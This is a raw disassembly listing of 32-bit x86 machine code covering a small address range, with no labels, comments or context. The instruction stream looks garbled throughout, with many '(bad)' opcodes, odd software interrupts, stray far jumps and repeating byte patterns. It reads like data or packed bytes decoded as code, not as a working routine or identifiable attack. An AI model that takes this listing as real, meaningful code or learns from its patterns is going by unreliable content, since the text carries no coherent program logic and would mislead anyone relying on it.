  425a9f:	int3   
  425aa0:	pop    ss
  425aa1:	aam    0x0
  425aa3:	add    BYTE PTR [eax],al
  425aa5:	int    0x8d
  425aa7:	adc    al,0x4
  425aa9:	add    bh,bh
  425aab:	shl    edx,cl
  425aad:	sub    BYTE PTR [ebx],bh
  425aaf:	jns    0x425a84
  425ab1:	mov    ebp,0xcdd35392
  425ab6:	(bad)  
  425ab7:	std    
  425ab8:	int    0x96
  425aba:	std    
  425abb:	add    al,0xfb
  425abd:	(bad)  
  425abe:	cmp    ecx,DWORD PTR [edi]
  425ac0:	shr    edx,cl
  425ac2:	sub    bl,dl
  425ac4:	jmp    0x425a58
  425ac6:	push   ebx
  425ac7:	adc    ecx,ebp
  425ac9:	xchg   esi,eax
  425aca:	std    
  425acb:	int    0xa6
  425acd:	std    
  425ace:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425ad4:	repz xchg edx,eax
  425ad6:	shl    ebp,cl
  425ad8:	sub    BYTE PTR [ebx-0x2b],dl
  425adb:	xchg   DWORD PTR [ebx],edx
  425add:	int    0x96
  425adf:	std    
  425ae0:	int    0xa6
  425ae2:	std    
  425ae3:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425ae9:	in     eax,0x28
  425aeb:	shl    ebx,cl
  425aed:	xchg   edx,eax
  425aee:	push   ebx
  425aef:	aad    0x87
  425af1:	adc    ecx,DWORD PTR [edx]
  425af3:	add    eax,0xd4cf
  425af8:	add    bh,cl
  425afa:	push   es
  425afb:	nop
  425afc:	add    BYTE PTR [eax],al
  425afe:	add    BYTE PTR [eax-0x33],dh
  425b01:	jbe    0x425b00
  425b03:	int    0x8d
  425b05:	std    
  425b06:	sar    bh,0x63
  425b09:	cmp    edi,DWORD PTR [ecx+0x3b]
  425b0c:	or     al,0xd3
  425b0e:	mov    ebp,0x28f2d392
  425b13:	push   ebx
  425b14:	shl    DWORD PTR [eax-0x33],cl
  425b17:	jbe    0x425b45
  425b19:	iret   
  425b1a:	or     DWORD PTR [ecx-0x80],eax
  425b1d:	add    BYTE PTR [eax+0x3d01cd71],0x81
  425b24:	add    BYTE PTR [eax-0x69ffb000],0x24
  425b2b:	int    0x8d
  425b2d:	push   esp
  425b2e:	or     al,BYTE PTR [ecx-0x32528933]
  425b34:	lea    esi,[ebp-0x6d82bad1]
  425b3a:	shr    ebx,cl
  425b3c:	xchg   edx,eax
  425b3d:	int    0x8d
  425b3f:	lods   eax,DWORD PTR ds:[esi]
  425b40:	int    0x96
  425b42:	mov    ch,0x3b
  425b44:	leave  
  425b45:	cmp    ebx,edx
  425b47:	push   ebx
  425b48:	icebp  
  425b49:	bound  eax,QWORD PTR [eax]
  425b4b:	(bad)  
  425b4c:	xor    al,0xd3
  425b4e:	repnz sub BYTE PTR [eax],al
  425b51:	(bad)  
  425b52:	inc    esp
  425b53:	mov    ebp,0xfb94
  425b58:	int    0x76
  425b5a:	lods   eax,DWORD PTR ds:[esi]
  425b5b:	int    0x8d
  425b5d:	mov    ch,0x2f
  425b5f:	inc    ebp
  425b60:	jge    0x425af4
  425b62:	shr    ebx,cl
  425b64:	xchg   edx,eax
  425b65:	int    0x8d
  425b67:	lods   eax,DWORD PTR ds:[esi]
  425b68:	int    0x96
  425b6a:	mov    ch,0x3b
  425b6c:	leave  
  425b6d:	cmp    ebx,edx
  425b6f:	push   ebx
  425b70:	icebp  
  425b71:	bound  eax,QWORD PTR [eax]
  425b73:	(bad)  
  425b74:	push   esp
  425b75:	shl    edx,cl
  425b77:	sub    BYTE PTR [eax],al
  425b79:	(bad)  
  425b7a:	cmp    al,0xbd
  425b7c:	inc    esp
  425b7d:	sti    
  425b7e:	add    BYTE PTR [eax],al
  425b80:	int    0x76
  425b82:	std    
  425b83:	int    0x8d
  425b85:	std    
  425b86:	cmp    ecx,DWORD PTR [ebx+edx*8]
  425b89:	repnz sub BYTE PTR [ebx],bh
  425b8c:	jns    0x425b61
  425b8e:	mov    ebp,0xcdd35392
  425b93:	(bad)  
  425b94:	std    
  425b95:	int    0x96
  425b97:	std    
  425b98:	cmp    ecx,DWORD PTR [edi]
  425b9a:	shr    ebx,cl
  425b9c:	xchg   edx,eax
  425b9d:	cmp    edx,ebp
  425b9f:	shr    edx,cl
  425ba1:	sub    BYTE PTR [ebx+0x13],dl
  425ba4:	xchg   ebx,edx
  425ba6:	int    0x8d
  425ba8:	std    
  425ba9:	int    0x96
  425bab:	std    
  425bac:	cmp    ecx,DWORD PTR [edi]
  425bae:	shr    ebx,cl
  425bb0:	xchg   edx,eax
  425bb1:	cmp    edx,ebp
  425bb3:	shr    edx,cl
  425bb5:	sub    BYTE PTR [ebx+0x13],dl
  425bb8:	xchg   ebx,edx
  425bba:	int    0x8d
  425bbc:	std    
  425bbd:	int    0x96
  425bbf:	std    
  425bc0:	cmp    ecx,DWORD PTR [edi]
  425bc2:	shr    ebx,cl
  425bc4:	xchg   edx,eax
  425bc5:	cmp    edx,ebp
  425bc7:	shr    edx,cl
  425bc9:	sub    BYTE PTR [ebx+0x13],dl
  425bcc:	xchg   ebx,edx
  425bce:	or     al,BYTE PTR [esi]
  425bd0:	nop
  425bd1:	add    BYTE PTR [eax],al
  425bd3:	add    ch,cl
  425bd5:	jbe    0x425c2b
  425bd7:	int    0x80
  425bd9:	int    0x8d
  425bdb:	mov    ebp,0x3bbd96cd
  425be0:	(bad)  
  425be2:	aad    0xd3
  425be4:	jmp    0x425b78
  425be6:	shr    edx,cl
  425be8:	sub    BYTE PTR [ebx+0x13],dl
  425beb:	or     al,BYTE PTR ds:0xd4cf
  425bf1:	add    ch,cl
  425bf3:	jbe    0x425c41
  425bf5:	int    0x80
  425bf7:	int    0x8d
  425bf9:	std    
  425bfa:	int    0x96
  425bfc:	std    
  425bfd:	cmp    ecx,DWORD PTR [edi]
  425bff:	shr    ebx,cl
  425c01:	xchg   edx,eax
  425c02:	int    0x6c
  425c04:	jo     0x425c41
  425c06:	aad    0xd3
  425c08:	jmp    0xcf05:0xa135328
  425c0f:	aam    0x0
  425c11:	add    BYTE PTR [eax],al
  425c13:	int    0x76
  425c15:	sbb    al,0xcd
  425c17:	lea    ebx,[ebx+edi*1]
  425c1a:	or     al,0xd3
  425c1c:	repnz sub BYTE PTR [ebx],bh
  425c1f:	jns    0x425bf4
  425c21:	mov    ebp,0xcdd35392
  425c26:	(bad)  
  425c27:	std    
  425c28:	int    0x96
  425c2a:	std    
  425c2b:	cmp    edx,ebp
  425c2d:	cmp    ecx,DWORD PTR [edi]
  425c2f:	shr    edx,cl
  425c31:	sub    bl,dl
  425c33:	jmp    0x425bc7
  425c35:	push   ebx
  425c36:	adc    ecx,ebp
  425c38:	xchg   esi,eax
  425c39:	std    
  425c3a:	int    0xa6
  425c3c:	std    
  425c3d:	cmp    ebx,DWORD PTR [ecx+0x492f3d3]
  425c43:	hlt    
  425c44:	call   ebx
  425c46:	in     eax,0x28
  425c48:	push   ebx
  425c49:	aad    0x87
  425c4b:	adc    ecx,DWORD PTR [edx]
  425c4d:	add    eax,0xd4cf
  425c52:	add    ch,cl
  425c54:	jbe    0x425c53
  425c56:	int    0x8d
  425c58:	std    
  425c59:	add    al,0x2
  425c5b:	call   ebx
  425c5d:	repnz sub BYTE PTR [ebx],bh
  425c60:	jns    0x425c35
  425c62:	mov    ebp,0xcdd35392
  425c67:	(bad)  
  425c68:	std    
  425c69:	int    0x96
  425c6b:	std    
  425c6c:	add    al,0xfb
  425c6e:	(bad)  
  425c6f:	cmp    ecx,DWORD PTR [edi]
  425c71:	shr    edx,cl
  425c73:	sub    bl,dl
  425c75:	jmp    0x425c09
  425c77:	push   ebx
  425c78:	adc    eax,DWORD PTR [edi-0x272322d]
  425c7e:	int    0x96
  425c80:	std    
  425c81:	add    al,0xfb
  425c83:	(bad)  
  425c84:	cmp    ecx,DWORD PTR [edi]
  425c86:	shr    edx,cl
  425c88:	sub    bl,dl
  425c8a:	jmp    0x425c1e
  425c8c:	push   ebx
  425c8d:	adc    ecx,edi
  425c8f:	pop    ss
  425c90:	nop
  425c91:	add    BYTE PTR [eax],al
  425c93:	add    BYTE PTR [edx-0x33],ah
  425c96:	xchg   esi,eax
  425c97:	std    
  425c98:	int    0xa6
  425c9a:	std    
  425c9b:	xchg   ebx,edx
  425c9d:	cmp    ebx,DWORD PTR [ecx+0xaa58dcf]
  425ca3:	int3   
  425ca4:	push   es
  425ca5:	aam    0x0
  425ca7:	add    BYTE PTR [eax],al
  425ca9:	int    0x76
  425cab:	sub    al,0x4
  425cad:	hlt    
  425cae:	call   ebx
  425cb0:	repz xchg edx,eax
  425cb2:	shl    ebp,cl
  425cb4:	sub    BYTE PTR [ebx-0x2b],dl
  425cb7:	iret   
  425cb8:	or     edi,ebp
  425cba:	add    BYTE PTR [eax+0x3d01cd80],0x81
  425cc1:	add    BYTE PTR [eax+0x50007162],0x0
  425cc8:	xchg   esi,eax
  425cc9:	and    al,0x6
  425ccb:	ins    DWORD PTR es:[edi],dx
  425ccc:	aam    0xbc
  425cce:	int    0x76
  425cd0:	in     eax,dx
  425cd1:	int    0x8d
  425cd3:	adc    DWORD PTR [edi],ebp
  425cd5:	inc    ebp
  425cd6:	jge    0x425c6a
  425cd8:	shr    ebx,cl
  425cda:	xchg   edx,eax
  425cdb:	int    0xe3
  425cdd:	int    0x7d
  425cdf:	int    0x76
  425ce1:	in     eax,dx
  425ce2:	int    0x96
  425ce4:	adc    DWORD PTR [ebx],edi
  425ce6:	fidivr DWORD PTR [ebx]
  425ce8:	lock shr DWORD PTR [ebp+0x4c76cd28],cl
  425cef:	push   ebx
  425cf0:	adc    ecx,ebp
  425cf2:	xor    BYTE PTR [ebx-0x76],al
  425cf5:	jo     0x425cc4
  425cf7:	xchg   esi,eax
  425cf8:	push   esp
  425cf9:	in     al,dx
  425cfa:	push   esp
  425cfb:	int    0x92
  425cfd:	int    0xa6
  425cff:	push   eax
  425d00:	retf   0x5324
  425d03:	or     DWORD PTR [eax+ecx*4],esp
  425d06:	int    0x76
  425d08:	cmc    
  425d09:	int    0x8d
  425d0b:	stc    
  425d0c:	das    
  425d0d:	inc    ebp
  425d0e:	jge    0x425ca2
  425d10:	shr    ebx,cl
  425d12:	xchg   edx,eax
  425d13:	int    0x8d
  425d15:	cmc    
  425d16:	int    0xa6
  425d18:	stc    
  425d19:	cmp    ecx,ecx
  425d1b:	cmp    ebx,ebp
  425d1d:	shl    edx,cl
  425d1f:	sub    ch,cl
  425d21:	lea    esi,[eax]
  425d23:	push   ebx
  425d24:	lds    eax,FWORD PTR [edi+0x4c76cd7d]
  425d2a:	int    0x1c
  425d2c:	inc    ebx
  425d2d:	(bad)  
  425d2e:	jo     0x425d3a
  425d30:	lea    esi,[eax]
  425d32:	or     cl,0xec
  425d35:	xchg   ch,cl
  425d37:	xchg   esi,eax
  425d38:	push   esp
  425d39:	int    0x76
  425d3b:	dec    esp
  425d3c:	int    0x4a
  425d3e:	int    0x20
  425d40:	xchg   DWORD PTR [esi-0x32e3f59c],ebx
  425d46:	sbb    al,0xcd
  425d48:	dec    edx
  425d49:	xchg   ebp,ecx
  425d4b:	sub    eax,0xa808080
  425d50:	lea    esi,[eax]
  425d52:	int    0x4a
  425d54:	int    0xa6
  425d56:	push   eax
  425d57:	xor    ecx,DWORD PTR [ecx*8+0x530a88a6]
  425d5e:	int    0x80
  425d60:	int    0x4a
  425d62:	xchg   DWORD PTR [esp+edi*1-0x33],edi
  425d66:	jbe    0x425d55
  425d68:	or     cl,BYTE PTR [ebp+0x118dcd0d]
  425d6e:	das    
  425d6f:	inc    ebp
  425d70:	jge    0x425d04
  425d72:	shr    ebx,cl
  425d74:	xchg   edx,eax
  425d75:	int    0x8d
  425d77:	in     eax,dx
  425d78:	int    0xa6
  425d7a:	adc    DWORD PTR [ebx],edi
  425d7c:	leave  
  425d7d:	cmp    ebx,ebp
  425d7f:	shl    edx,cl
  425d81:	sub    BYTE PTR [ebx-0x3b],dl
  425d84:	or     dh,BYTE PTR [esi+0x44]
  425d87:	int    0x76
  425d89:	xor    bl,ch
  425d8b:	les    eax,FWORD PTR [ecx+0x76cd8080]
  425d91:	in     eax,dx
  425d92:	int    0x8d
  425d94:	adc    DWORD PTR [edi],ebp
  425d96:	inc    ebp
  425d97:	jge    0x425d2b
  425d99:	shr    ebx,cl
  425d9b:	xchg   edx,eax
  425d9c:	int    0x8d
  425d9e:	in     eax,dx
  425d9f:	int    0xa6
  425da1:	adc    ebx,edx
  425da3:	repnz sub ch,cl
  425da6:	lea    edx,[ebx+edi*1]
  425da9:	leave  
  425daa:	cmp    ebx,ebp
  425dac:	add    al,0xd3
  425dae:	stc    
  425daf:	push   ebx
  425db0:	(bad)
  425db3:	inc    ebx
  425db4:	shr    DWORD PTR [edi],cl
  425db6:	add    al,0xf7
  425db8:	add    BYTE PTR [eax+0x30a6cd80],0xcf
  425dbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425dc0:	dec    ebx
  425dc1:	mov    BYTE PTR [ebx],dh
  425dc3:	jge    0x425dcf
  425dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425dc6:	xor    al,0xa
  425dc8:	lea    edi,[ecx*8+0x76cdf18d]
  425dcf:	xchg   ebp,eax
  425dd0:	das    
  425dd1:	inc    ebp
  425dd2:	rcl    DWORD PTR [edx-0x326d422d],cl
  425dd8:	jbe    0x425dcb
  425dda:	int    0xa6
  425ddc:	xchg   ebp,eax
  425ddd:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425de3:	cmp    esi,eax
  425de5:	cmp    ebx,ebp
  425de7:	push   ebx
  425de8:	or     al,0xcd
  425dea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425deb:	stc    
  425dec:	das    
  425ded:	inc    ebp
  425dee:	popf   
  425def:	xchg   edx,eax
  425df0:	or     dh,BYTE PTR [esi+0x54]
  425df3:	int    0x76
  425df5:	cmc    
  425df6:	push   ecx
  425df7:	out    0x54,al
  425df9:	add    al,0xd3
  425dfb:	dec    edx
  425dfc:	shr    esp,cl
  425dfe:	xchg   edx,eax
  425dff:	int    0xa6
  425e01:	stc    
  425e02:	cmp    ebx,ebp
  425e04:	mov    DWORD PTR [esi+0x54b6d554],esp
  425e0a:	int    0xa6
  425e0c:	cmc    
  425e0d:	int    0x8d
  425e0f:	stc    
  425e10:	das    
  425e11:	inc    ebp
  425e12:	or     al,0x92
  425e14:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e1a:	shr    ebx,cl
  425e1c:	xchg   edx,eax
  425e1d:	int    0x8d
  425e1f:	stc    
  425e20:	cmp    ecx,ebx
  425e22:	shr    DWORD PTR [ebp+0x5476cd28],cl
  425e28:	cmp    esp,ecx
  425e2a:	push   ebx
  425e2b:	fcmovne st,st(5)
  425e2d:	lea    esi,[edi+ebp*1]
  425e30:	mov    ebx,0x2bc53389
  425e35:	ror    ebp,cl
  425e37:	(bad)  
  425e38:	icebp  
  425e39:	or     dh,BYTE PTR [esi+0x54]
  425e3c:	int    0x76
  425e3e:	xchg   ebp,eax
  425e3f:	das    
  425e40:	inc    ebp
  425e41:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e47:	jbe    0x425e3a
  425e49:	int    0xa6
  425e4b:	xchg   ebp,eax
  425e4c:	shr    DWORD PTR [ebp+0x3476cd28],cl
  425e52:	das    
  425e53:	mov    ebx,0xa6020180
  425e58:	cmp    ebx,ebp
  425e5a:	dec    edx
  425e5b:	or     al,0x1
  425e5d:	ror    DWORD PTR [edx-0x2b],cl
  425e60:	mov    ebp,0xbdbfcb3b
  425e65:	or     ah,BYTE PTR [ebx]
  425e67:	and    eax,0x92d3352f
  425e6c:	shr    DWORD PTR [ebp+0x37d65692],cl
  425e72:	ficom  WORD PTR [ebx]
  425e74:	cmp    ecx,DWORD PTR [esi+eiz*2]
  425e77:	fidiv  WORD PTR [edi]
  425e79:	ficom  WORD PTR [ebx]
  425e7b:	(bad)  
  425e7c:	ss inc ebx
  425e7e:	or     al,0xd6
  425e80:	cs int 0x92
  425e83:	int    0x8d
  425e85:	xor    BYTE PTR [edi+0x548dcd81],al
  425e8b:	add    al,0x64
  425e8d:	mov    BYTE PTR [eax-0x6d32ce2c],al
  425e93:	int    0x8d
  425e95:	xor    BYTE PTR [edi-0x7772327f],al
  425e9b:	xchg   DWORD PTR [esi+0x54],esi
  425e9e:	int    0x89
  425ea0:	or     DWORD PTR [eax-0x6dcb89fc],0x2f3c8d00
  425eaa:	push   es
  425eab:	and    eax,DWORD PTR [eax]
  425ead:	add    BYTE PTR [eax],al
  425eaf:	in     al,dx
  425eb0:	test   DWORD PTR [edi+0x25230abd],edi
  425eb6:	int    0x76
  425eb8:	adc    al,0x81
  425eba:	jbe    0x425f00
  425ebc:	leave  
  425ebd:	jbe    0x425f2c
  425ebf:	scas   al,BYTE PTR es:[edi]
  425ec0:	aaa    
  425ec1:	ficom  WORD PTR [ebx]
  425ec3:	or     ah,BYTE PTR [esi+0x6d76cd75]
  425ec9:	int    0x8d
  425ecb:	jne    0x425efc
  425ecd:	inc    ebp
  425ece:	jge    0x425e62
  425ed0:	shr    ebx,cl
  425ed2:	xchg   edx,eax
  425ed3:	int    0x8d
  425ed5:	ins    DWORD PTR es:[edi],dx
  425ed6:	int    0xa6
  425ed8:	jne    0x425ead
  425eda:	repnz sub ch,cl
  425edd:	lea    ecx,[ebp+ecx*8-0x77]
  425ee1:	cmp    ecx,ecx
  425ee3:	cmp    ebx,ebp
  425ee5:	push   ebx
  425ee6:	(bad)
  425ee9:	shl    esp,cl
  425eeb:	int    0x8d
  425eed:	inc    esp
  425eee:	inc    ebx
  425eef:	mov    BYTE PTR [edi+0x54],dh
  425ef2:	int    0x76
  425ef4:	xor    BYTE PTR [edi+0x760a1476],al
  425efa:	xor    ch,cl
  425efc:	ins    BYTE PTR es:[edi],dx
  425efd:	test   BYTE PTR [edx],cl
  425eff:	jbe    0x425f15
  425f01:	int    0x76
  425f03:	in     eax,dx
  425f04:	int    0x8d
  425f06:	adc    DWORD PTR [edi],ebp
  425f08:	inc    ebp
  425f09:	jge    0x425e9d
  425f0b:	shr    ebx,cl
  425f0d:	xchg   edx,eax
  425f0e:	int    0x8d
  425f10:	in     eax,dx
  425f11:	int    0xa6
  425f13:	adc    DWORD PTR [ebx],edi
  425f15:	fnstsw WORD PTR [ebx]
  425f17:	leave  
  425f18:	push   ebx
  425f19:	(bad)
  425f1c:	sub    BYTE PTR [esi+0x76],bl
  425f1f:	adc    al,0x2f
  425f21:	push   es
  425f22:	mov    esi,0xcd0000ff
  425f27:	(bad)  
  425f28:	std    
  425f29:	int    0x96
  425f2b:	std    
  425f2c:	cmp    ecx,DWORD PTR [edi]
  425f2e:	shr    ebx,cl
  425f30:	xchg   edx,eax
  425f31:	sar    bh,0x9c
  425f34:	cmp    esi,ecx
  425f36:	shr    edx,cl
  425f38:	sub    BYTE PTR [ebx+0x13],dl
  425f3b:	int    0x96
  425f3d:	std    
  425f3e:	int    0xa6
  425f40:	std    
  425f41:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f47:	popf   
  425f48:	shl    ebp,cl
  425f4a:	sub    BYTE PTR [ebx-0x2b],dl
  425f4d:	xchg   DWORD PTR [ebx],edx
  425f4f:	int    0x96
  425f51:	std    
  425f52:	int    0xa6
  425f54:	std    
  425f55:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f5b:	popf   
  425f5c:	shl    ebp,cl
  425f5e:	sub    BYTE PTR [ebx-0x2b],dl
  425f61:	xchg   DWORD PTR [ebx],edx
  425f63:	int    0x96
  425f65:	std    
  425f66:	int    0xa6
  425f68:	std    
  425f69:	cmp    ebx,DWORD PTR [ecx-0xc2c62c5]
  425f6f:	xchg   edx,eax
  425f70:	shl    ebp,cl
  425f72:	sub    BYTE PTR [ebx-0x2b],dl
  425f75:	xchg   DWORD PTR [ebx],edx
  425f77:	or     cl,bh
  425f79:	nop
  425f7a:	add    BYTE PTR [eax],al
  425f7c:	add    ch,cl
  425f7e:	lea    edx,[eax-0x33]
  425f81:	xchg   esi,eax
  425f82:	mov    ebp,0x3bbda6cd
  425f87:	cdq    
  425f88:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425f8e:	in     eax,0x28
  425f90:	push   ebx
  425f91:	aad    0xa
  425f93:	int3   
  425f94:	pop    ss
  425f95:	aam    0x0
  425f97:	add    BYTE PTR [eax],al
  425f99:	int    0x8d
  425f9b:	dec    esp
  425f9c:	int    0x89
  425f9e:	int    0x96
  425fa0:	std    
  425fa1:	int    0xa6
  425fa3:	std    
  425fa4:	int    0x7e
  425fa6:	jo     0x425fe3
  425fa8:	cdq    
  425fa9:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425faf:	in     eax,0x28
  425fb1:	push   ebx
  425fb2:	aad    0xa
  425fb4:	int3   
  425fb5:	pop    ss
  425fb6:	aam    0x0
  425fb8:	add    BYTE PTR [eax],al
  425fba:	int    0x8d
  425fbc:	sbb    al,0xcd
  425fbe:	xchg   esi,eax
  425fbf:	sbb    al,0x3b
  425fc1:	icebp  
  425fc2:	shr    edx,cl
  425fc4:	sub    BYTE PTR [ebx],bh
  425fc6:	psrlq  mm5,mm3
  425fc9:	xchg   edx,eax
  425fca:	push   ebx
  425fcb:	adc    ecx,ebp
  425fcd:	xchg   esi,eax
  425fce:	std    
  425fcf:	int    0xa6
  425fd1:	std    
  425fd2:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425fd8:	cdq    
  425fd9:	shl    ebp,cl
  425fdb:	sub    bl,dl
  425fdd:	repz xchg edx,eax
  425fdf:	push   ebx
  425fe0:	aad    0xcd
  425fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fe3:	std    
  425fe4:	cmp    edi,DWORD PTR [ecx+0x4]
  425fe7:	hlt    
  425fe8:	call   ebx
  425fea:	mov    ebp,0x28e5d392
  425fef:	push   ebx
  425ff0:	lds    eax,FWORD PTR [edi+0x17cc0af1]
  425ff6:	aam    0x0
  425ff8:	add    BYTE PTR [eax],al
  425ffa:	int    0x8d
  425ffc:	std    
  425ffd:	int    0x96
  425fff:	std    
  426000:	cmp    ecx,DWORD PTR [edi]
  426002:	shr    ebx,cl
  426004:	xchg   edx,eax
  426005:	sar    bh,0x9c
  426008:	cmp    esi,ecx
  42600a:	shr    edx,cl
  42600c:	sub    BYTE PTR [ebx+0x13],dl
  42600f:	int    0x96
  426011:	std    
  426012:	int    0xa6
  426014:	std    
  426015:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42601b:	popf   
  42601c:	shl    ebp,cl
  42601e:	sub    BYTE PTR [ebx-0x2b],dl
  426021:	xchg   DWORD PTR [ebx],edx
  426023:	int    0x96
  426025:	std    
  426026:	int    0xa6
  426028:	std    
  426029:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42602f:	popf   
  426030:	shl    ebp,cl
  426032:	sub    BYTE PTR [ebx-0x2b],dl
  426035:	xchg   DWORD PTR [ebx],edx
  426037:	iret   
  426038:	xchg   esi,eax
  426039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42603a:	or     dl,BYTE PTR ds:0xd4cf
  426040:	add    bh,cl
  426042:	iret   
  426043:	nop
  426044:	add    BYTE PTR [eax],al
  426046:	add    BYTE PTR [ecx-0x33],dh
  426049:	(bad)  
  42604a:	std    
  42604b:	int    0x96
  42604d:	std    
  42604e:	cmp    ecx,DWORD PTR [edi]
  426050:	int    0xd6
  426052:	sub    al,0x3b
  426054:	icebp  
  426055:	shr    ebx,cl
  426057:	xchg   edx,eax
  426058:	shr    edx,cl
  42605a:	sub    BYTE PTR [ebx+0x13],dl
  42605d:	jno    0x42602e
  42605f:	pop    es
  426060:	out    dx,eax
  426061:	add    BYTE PTR [eax+0x7cd7080],0x3d
  426068:	add    DWORD PTR [eax+0x500080],0x7cd2496
  426072:	add    DWORD PTR [ecx+0x760a8080],eax
  426078:	dec    esp
  426079:	int    0x76
  42607b:	mov    ch,cl
  42607d:	mov    BYTE PTR [edi-0x72f5b373],al
  426083:	dec    esp
  426084:	int    0x8d
  426086:	cmc    
  426087:	int    0x96
  426089:	stc    
  42608a:	das    
  42608b:	inc    ebp
  42608c:	jecxz  0x426020
  42608e:	shl    ebx,cl
  426090:	xchg   edx,eax
  426091:	int    0x96
  426093:	cmc    
  426094:	int    0xd6
  426096:	stc    
  426097:	cmp    esi,edi
  426099:	shr    edx,cl
  42609b:	sub    ch,cl
  42609d:	xchg   esi,eax
  42609e:	cmc    
  42609f:	cmp    esi,eax
  4260a1:	push   ebx
  4260a2:	bswap  ebp
  4260a4:	(bad)  
  4260a5:	stc    
  4260a6:	das    
  4260a7:	inc    ebp
  4260a8:	sti    
  4260a9:	xchg   edx,eax
  4260aa:	shr    edi,cl
  4260ac:	xchg   edx,eax
  4260ad:	int    0xd6
  4260af:	cmc    
  4260b0:	int    0xa6
  4260b2:	stc    
  4260b3:	cmp    ebx,ecx
  4260b5:	cmp    ebx,ebp
  4260b7:	push   ebx
  4260b8:	aad    0x87
  4260ba:	adc    ecx,ebp
  4260bc:	xchg   esi,eax
  4260bd:	cmc    
  4260be:	sar    DWORD PTR [ecx-0x62932d8],cl
  4260c4:	das    
  4260c5:	inc    ebp
  4260c6:	sti    
  4260c7:	xchg   edx,eax
  4260c8:	shr    edi,cl
  4260ca:	xchg   edx,eax
  4260cb:	int    0xd6
  4260cd:	cmc    
  4260ce:	int    0xa6
  4260d0:	stc    
  4260d1:	cmp    ebx,ecx
  4260d3:	cmp    ebx,ebp
  4260d5:	push   ebx
  4260d6:	aad    0x87
  4260d8:	adc    ecx,ebp
  4260da:	xchg   esi,eax
  4260db:	cmc    
  4260dc:	sar    DWORD PTR [ecx-0x62932d8],cl
  4260e2:	das    
  4260e3:	inc    ebp
  4260e4:	sti    
  4260e5:	xchg   edx,eax
  4260e6:	shr    edi,cl
  4260e8:	xchg   edx,eax
  4260e9:	int    0xd6
  4260eb:	cmc    
  4260ec:	cmp    ebx,ecx
  4260ee:	int    0xe6
  4260f0:	stc    
  4260f1:	cmp    eax,DWORD PTR [eax]
  4260f3:	push   ebx
  4260f4:	fld    DWORD PTR [edi+0x707113]
  4260fa:	(bad)  
  4260fb:	dec    esp
  4260fc:	sar    DWORD PTR [ecx-0x12c242d8],cl
  426102:	add    BYTE PTR [eax],al
  426104:	int    0x76
  426106:	or     eax,0xcb63a8aa
  42610b:	rcl    BYTE PTR [eax-0x80],cl
  42610e:	xchg   esi,eax
  42610f:	int    0xed
  426111:	add    al,0xed
  426113:	inc    esp
  426114:	pop    ebx
  426115:	cwde   
  426116:	call   0x76c9:0xcb3bdd3b
  42611d:	popf   
  42611e:	(bad)  
  42611f:	aaa    
  426120:	ficom  WORD PTR [ebx]
  426122:	pop    ebp
  426123:	mov    ebp,0xa25230a
  426128:	jbe    0x4260cf
  42612a:	leave  
  42612b:	jbe    0x4260ea
  42612d:	xchg   ecx,eax
  42612e:	aaa    
  42612f:	ficom  WORD PTR [ebx]
  426131:	or     dh,BYTE PTR [esi-0x13]
  426134:	leave  
  426135:	jbe    0x426124
  426137:	dec    ecx
  426138:	mov    al,ds:0x76c93586
  42613d:	cmc    
  42613e:	dec    ecx
  42613f:	lahf   
  426140:	xchg   BYTE PTR ds:0x691176c9,dh
  426146:	and    DWORD PTR [esi+0x1176c935],eax
  42614c:	cmp    DWORD PTR [ecx],esp
  42614e:	xchg   BYTE PTR ds:0x49f976c9,dh
  426154:	and    DWORD PTR [ebp+esi*1+0xa8476cf],eax
  42615b:	jbe    0x426156
  42615d:	int    0x76
  42615f:	sbb    al,0xcd
  426161:	shl    BYTE PTR ds:0xcd808081,1
  426167:	jbe    0x426185
  426169:	int    0x8d
  42616b:	sbb    al,0xcd
  42616d:	add    DWORD PTR ds:0xcd808081,ebp
  426173:	xor    ch,cl
  426175:	pop    esp
  426176:	xchg   eax,esp
  426178:	fs int 0x96
  42617b:	popf   
  42617c:	int    0xa
  42617e:	and    eax,0xa808081
  426183:	out    0xb5,al
  426185:	int    0xe6
  426187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426188:	das    
  426189:	inc    ebp
  42618a:	add    edx,DWORD PTR [edx-0x326def2d]
  426190:	out    0x9d,al
  426192:	int    0xa6
  426194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426195:	adc    bh,bl
  426197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426198:	mov    esi,0xdd3b4229
  42619d:	shr    ecx,cl
  42619f:	sub    ch,cl
  4261a1:	pop    esi
  4261a2:	push   ebx
  4261a3:	aad    0x43
  4261a5:	(bad)  
  4261a7:	nop
  4261a8:	int    0x18
  4261aa:	or     dl,BYTE PTR [esi+0x1496cdf9]
  4261b0:	int    0x96
  4261b2:	xor    ch,cl
  4261b4:	xchg   esi,eax
  4261b5:	dec    esp
  4261b6:	iret   
  4261b7:	xchg   esi,eax
  4261b8:	lods   eax,DWORD PTR ds:[esi]
  4261b9:	bound  eax,QWORD PTR [eax]
  4261bb:	(bad)  
  4261bc:	stc    
  4261bd:	jno    0x42622f
  4261bf:	cwde   
  4261c0:	add    dh,dl
  4261c2:	sbb    al,0xcf
  4261c4:	jbe    0x42617b
  4261c6:	add    dh,dl
  4261c8:	mov    BYTE PTR [eax],al
  4261ca:	(bad)  
  4261cb:	cmc    
  4261cc:	add    dh,dl
  4261ce:	adc    DWORD PTR [eax],eax
  4261d0:	(bad)  
  4261d1:	in     eax,dx
  4261d2:	jo     0x4261a3
  4261d4:	jbe    0x4261d3
  4261d6:	jo     0x426195
